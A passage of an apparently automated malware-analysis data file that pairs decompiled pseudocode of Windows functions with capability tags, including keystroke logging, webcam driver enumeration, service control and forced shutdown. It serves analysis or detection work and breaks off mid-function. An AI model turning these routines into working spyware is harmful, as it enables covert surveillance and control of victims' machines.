        "decompiled_code": "\nvoid __cdecl fcn.00471654(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY124;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint lpServiceStatus;\n    uint var_28h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack64 = 0x471671;\n    var_8h = in_EDX;\n    fcn.004058ec();\n    uStack68 = 0x47173a;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.0040546c();\n    var_28h = 0;\n    var_10h = 0;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        if (var_ch == 0) {\n            uVar4 = 0x20;\n        }\n        else {\n            uVar4 = 0x10;\n        }\n        uVar2 = fcn.004058fc(uVar4 | 4);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            if (var_8h != 0) {\n                if (var_ch == 0) {\n                    sub.advapi32.dll_ControlService(iVar3, 1, &fcn.00471654::lpServiceStatus);\n                }\n                else {\n                    sub.advapi32.dll_StartServiceA(iVar3, 0, &fcn.00471654::var_10h);\n                }\n            }\n            sub.advapi32.dll_QueryServiceStatus(iVar3, &fcn.00471654::lpServiceStatus);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY124 = iVar1;\n    }\n    fcn.0047151c();\n    *in_FS_OFFSET = iStackY124;\n    fcn.0040546c(0x471741);\n    return;\n}\n",
        "token_count": 541
    },
    "00472134": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00472134(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uVar3;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.00472134::var_1h + 1;\n    puStack44 = &fcn.00472134::var_1h + 1;\n    uStack36 = 0x4722a6;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar2 = 1;\n    uStack48 = 0x47227f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack56 = 10;\n    puStack60 = 0x472168;\n    var_1h._0_1_ = in_AL;\n    sub.kernel32.dll_Sleep_1();\n    puStack60 = 0x472177;\n    fcn.00405894();\n    if (uVar2) {\n        puStack60 = 0x47218e;\n        fcn.00466c74();\n    }\n    puStack60 = 0x47219d;\n    fcn.00405894();\n    if (uVar2) {\n        puStack60 = 0x4721a4;\n        fcn.0048284c();\n    }\n    uStack64 = 0x4721e8;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack60 = &fcn.00472134::var_1h + 1;\n    fcn.0046d7ec();\n    fcn.0046d92c();\n    fcn.0046e2bc();\n    fcn.0046e5cc();\n    fcn.0046e6bc();\n    fcn.0046e7ac();\n    fcn.0046e3ac();\n    fcn.0046e4dc();\n    *in_FS_OFFSET = uStack68;\n    uVar2 = var_1h == '\\x01';\n    if (uVar2) {\n        puStack60 = 0x472202;\n        fcn.00488ea4();\n    }\n    puStack60 = 0x472310;\n    uStack64 = *0x498908;\n    uStack68 = 0x47233c;\n    fcn.00405800();\n    fcn.00463cc4();\n    uVar3 = 0;\n    uVar1 = sub.user32.dll_FindWindowA(0x472340, 0, &fcn.00472134::var_8h);\n    sub.user32.dll_GetWindowThreadProcessId(uVar1);\n    uVar1 = *0x4987e4;\n    sub.wsock32.dll_closesocket();\n    fcn.00405894();\n    if (uVar2) {\n        fcn.00463be0();\n        sub.kernel32.dll_GetCurrentProcessId();\n        fcn.00463be0();\n    }\n    sub.kernel32.dll_GetCurrentProcessId();\n    fcn.00463be0();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar3;\n    uStack68 = 0x4722ad;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 841
    },
    "0047fb98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_eh\n\nvoid fcn.0047fb98(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint uVar4;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    int32_t var_eh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    *0x4 = 8;\n    do {\n        var_4h = 0;\n        *0x4 = *0x4 + -1;\n    } while (*0x4 != 0);\n    var_18h = 0x47fd3b;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047fb98::var_1ch;\n    fVar3 = fcn.0040bc6c();\n    var_24h = SUB84(fVar3, 0);\n    var_20h = fVar3 >> 0x20;\n    fcn.0040b8e4(&fcn.0047fb98::var_8h, var_24h, var_20h);\n    fVar3 = fcn.0040bc6c();\n    var_30h = SUB84(fVar3, 0);\n    var_2ch = fVar3 >> 0x20;\n    fcn.0040bbc4(var_30h, var_2ch);\n    uVar4 = **0x4925e8;\n    fcn.004708cc(uVar4);\n    uVar1 = **0x492804;\n    fcn.0048beb0(uVar1);\n    fcn.00409ce8(var_18h);\n    fcn.00409ce8(0x47fd50, var_1ch);\n    fcn.00409ce8(0x47fd50, var_20h);\n    fcn.00409ce8(0x47fd5c, var_24h);\n    fcn.00409ce8(&fcn.0047fb98::var_8h);\n    fcn.00409ce8(var_2ch);\n    fcn.00409ce8(var_30h);\n    fcn.00409ce8(uVar4);\n    fcn.00405800(0x47fd68, uVar1);\n    fcn.0047fb34(var_14h);\n    fcn.00405738();\n    cVar2 = fcn.004709e0();\n    uVar4 = 0x47fced;\n    fcn.004709c0();\n    if (cVar2 != '\\0') {\n        fcn.0047fb34();\n        fcn.00405738();\n        uVar4 = fcn.004058fc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00405490(0x47fd42);\n    return;\n}\n",
        "token_count": 907
    },
    "00488ea4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00488ea4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uchar auStack44 [40];\n    \n    if (**0x492aec == 2) {\n        uStack52 = 0x28;\n        uStack56 = 0x488ebc;\n        puStack48 = &stack0xffffffd4;\n        uStack56 = sub.kernel32.dll_GetCurrentProcess();\n        puStack60 = 0x488ec2;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            puStack60 = &stack0xffffffd4;\n            uStack64 = 0x488f34;\n            uVar2 = 0;\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0);\n            puStack60 = 0x1;\n            puStack48 = 0x2;\n            uStack64 = 0;\n            if (iVar1 != 0) {\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (uVar2, 0, &stack0xffffffc4, 0x10, &stack0xffffffd4, &stack0xffffffc0);\n            }\n        }\n    }\n    iVar1 = sub.user32.dll_ExitWindowsEx();\n    return iVar1 != 0;\n}\n",
        "token_count": 323
    },
    "00489b5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00489b5c(uint param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x489c5e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_ch = 0;\n    fcn.0040546c();\n    for (uVar2 = param_2 >> 4; uVar2 != 0; uVar2 = uVar2 - 1) {\n        if (var_ch <= var_ch + 0xf) {\n            iVar4 = ((var_ch + 0xf) - var_ch) + 1;\n            iVar3 = var_ch;\n            do {\n                if ((*(in_EAX + iVar3) < 0x20) || (0xfa < *(in_EAX + iVar3))) {\n                    fcn.004054c0();\n                }\n                else {\n                    fcn.00405654();\n                    fcn.00405738();\n                }\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        var_ch = var_ch + 0x10;\n    }\n    uVar2 = param_2 & 0xf;\n    if (uVar2 != 0) {\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            uVar1 = *((in_EAX + param_2) - uVar2);\n            if ((uVar1 < 0x20) || (0xfa < uVar1)) {\n                fcn.004054c0();\n            }\n            else {\n                fcn.00405654();\n                fcn.00405738();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x489c65;\n    uStack48 = 0x489c5d;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 550
    },
    "0048a324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a324(code *param_1)\n\n{\n    char in_AL;\n    char cVar1;\n    \n    cVar1 = fcn.0048a288();\n    if (cVar1 != '\\0') {\n        if (in_AL == '\\x01') {\n            (*param_1)(0xffffffff);\n        }\n        else {\n            (*param_1)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "0048c0d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048c0d4(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack560;\n    uint uStack556;\n    uchar *puStack552;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ah;\n    uint var_105h;\n    \n    puStack552 = &stack0xfffffffc;\n    uStack556 = 0x48c19b;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    iVar2 = 0;\n    while (iVar1 = sub.AVICAP32.DLL_capGetDriverDescriptionA_1\n                             (iVar2, &fcn.0048c0d4::var_105h, 0x105, &fcn.0048c0d4::var_20ah, 0x105),  iVar1 != 0) {\n        fcn.004056dc(*in_EAX);\n        fcn.004056dc(0x48c1b4, 0);\n        fcn.00405800(0x48c1c0, 0);\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack560;\n    puStack552 = 0x48c1a2;\n    uStack556 = 0x48c19a;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 330
    },
    "0048c1c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.0048c1c4(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0x48c200;\n    uStack20 = 0x48c210;\n    iStack24 = 0x48c1d6;\n    iStack24 = sub.kernel32.dll_GetModuleHandleA_2();\n    pcVar1 = sub.kernel32.dll_GetProcAddress_1();\n    if (pcVar1 == NULL) {\n        unaff_EBX = 0;\n    }\n    else {\n        uVar2 = sub.kernel32.dll_GetCurrentProcess(&stack0xffffffe8);\n        iVar3 = (*pcVar1)(uVar2);\n        if (iVar3 != 0) {\n            unaff_EBX = iStack24 != 0;\n        }\n    }\n    return CONCAT44(iStack24, unaff_EBX);\n}\n",
        "token_count": 229
    },
    "00403e20": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00403e20(void)\n\n{\n    fcn.00403d40();\n    return;\n}\n",
        "token_count": 25
    },
    "00404534": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00404534(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x4045bb;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404520();\n    fcn.004056d0();\n    uVar1 = fcn.0040572c();\n    uVar1 = fcn.004058fc(uVar1);\n    uVar1 = fcn.0040572c(uVar1);\n    uVar1 = fcn.004058fc(uVar1);\n    uVar2 = 0x800;\n    sub.kernel32.dll_CompareStringA(0x800, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x4045c2);\n    return;\n}\n",
        "token_count": 245
    },
    "0040a0e4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a0e4(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.004058fc(*((param_2 & 3) * 4 + 0x490850), *(((param_2 & 0xf0) >> 4) * 4 + 0x49085c), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 171
    },
    "0040b251": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b251(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_2ch;\n    uint var_5h;\n    \n    uVar3 = *(unaff_EBP + 8);\n    if (0x11 < uVar3) {\n        uVar3 = 0x12;\n    }\n    iVar2 = *(unaff_EBP + -0x2c);\n    if (iVar2 < 1) {\n        pcVar5 = unaff_EDI + 1;\n        *unaff_EDI = '0';\n    }\n    else {\n        iVar4 = 0;\n        if (*(unaff_EBP + 0x10) != '\\x02') {\n            iVar4 = (*(unaff_EBP + -0x2c) - 1U) % 3 + 1;\n        }\n        while( true ) {\n            pcVar6 = unaff_EDI;\n            cVar1 = fcn.0040b1a6();\n            pcVar5 = pcVar6 + 1;\n            *pcVar6 = cVar1;\n            iVar2 = extraout_ECX + -1;\n            uVar3 = extraout_EDX;\n            if (iVar2 == 0) break;\n            iVar4 = iVar4 + -1;\n            unaff_EDI = pcVar5;\n            if ((iVar4 == 0) && (*(unaff_EBP + -6) != '\\0')) {\n                *pcVar5 = *(unaff_EBP + -6);\n                iVar4 = 3;\n                unaff_EDI = pcVar6 + 2;\n            }\n        }\n    }\n    if (uVar3 != 0) {\n        pcVar6 = pcVar5;\n        if (*(unaff_EBP + -5) != '\\0') {\n            pcVar6 = pcVar5 + 1;\n            *pcVar5 = *(unaff_EBP + -5);\n        }\n        for (; iVar2 != 0; iVar2 = iVar2 + 1) {\n            *pcVar6 = '0';\n            uVar3 = uVar3 - 1;\n            if (uVar3 == 0) {\n                return;\n            }\n            pcVar6 = pcVar6 + 1;\n        }\n        do {\n            cVar1 = fcn.0040b1a6();\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (extraout_EDX_00 != 1);\n    }\n    return;\n}\n",
        "token_count": 647
    },
    "0040ea7c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040ea7c(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    *0x4958c8 = 0x409;\n    *0x4958cc = 9;\n    *0x4958d0 = 1;\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar1 != 0) {\n        *0x4958c8 = uVar1;\n    }\n    if (uVar1 != 0) {\n        *0x4958cc = uVar1 & 0x3ff;\n        *0x4958d0 = (uVar1 & 0xffff) >> 10;\n    }\n    puVar3 = 0x40eb20;\n    puVar4 = 0x490820;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((*0x4907dc < 5) || (*0x4907d8 != 2)) {\n        iVar2 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x4958d5 = iVar2 != 0;\n    }\n    else {\n        *0x4958d5 = true;\n    }\n    iVar2 = sub.user32.dll_GetSystemMetrics(0x2a);\n    *0x4958d4 = iVar2 != 0;\n    if (*0x4958d4) {\n        fcn.0040ea20(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "00416624": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416624(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "004204a8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004204a8(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x420512;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 283
    },
    "004257b8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004257b8(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_2 = param_2 + -1;\n    if (-1 < param_2) {\n        if (**0x4929fc < 3) {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n        else {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "00436ef8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00436ef8(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.00436e3c();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004047cc();\n            if (cVar3 != '\\0') {\n                fcn.00435ee4();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.00435ee4();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.004365a4();\n        uVar2 = fcn.00436a8c();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.00433d3c();\n        }\n        uVar1 = *(**0x49291c + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x277) == '\\x02')) && (piVar4 == *(uVar1 + 0x2a0))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x29c), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.00457a28();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 456
    },
    "0043dff0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043dff0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0043e940();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0043e98c();\n            if (*(iVar2 + 0x273) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 125
    },
    "0043f130": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0043f130(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x277) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 77
    },
    "0044d62c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d62c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 116
    },
    "0048a02c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a02c(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff6c;\n    uint uStack112;\n    uint uStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint uStack28;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    puStack68 = 0x48a042;\n    fcn.004058ec();\n    uStack72 = 0x48a15a;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack84 = 0x48a133;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    var_5h = true;\n    if (**0x492aec == 2) {\n        var_5h = 0;\n        puStack92 = &fcn.0048a02c::TokenHandle;\n        uStack96 = 0x28;\n        uStack100 = 0x48a088;\n        puStack68 = &stack0xfffffffc;\n        uStack100 = sub.kernel32.dll_GetCurrentProcess();\n        puStack104 = 0x48a08e;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            uStack108 = 0x48a117;\n            uStack112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff90;\n            puStack104 = &stack0xfffffffc;\n            uVar2 = fcn.004058fc(&fcn.0048a02c::var_1ch);\n            iVar1 = 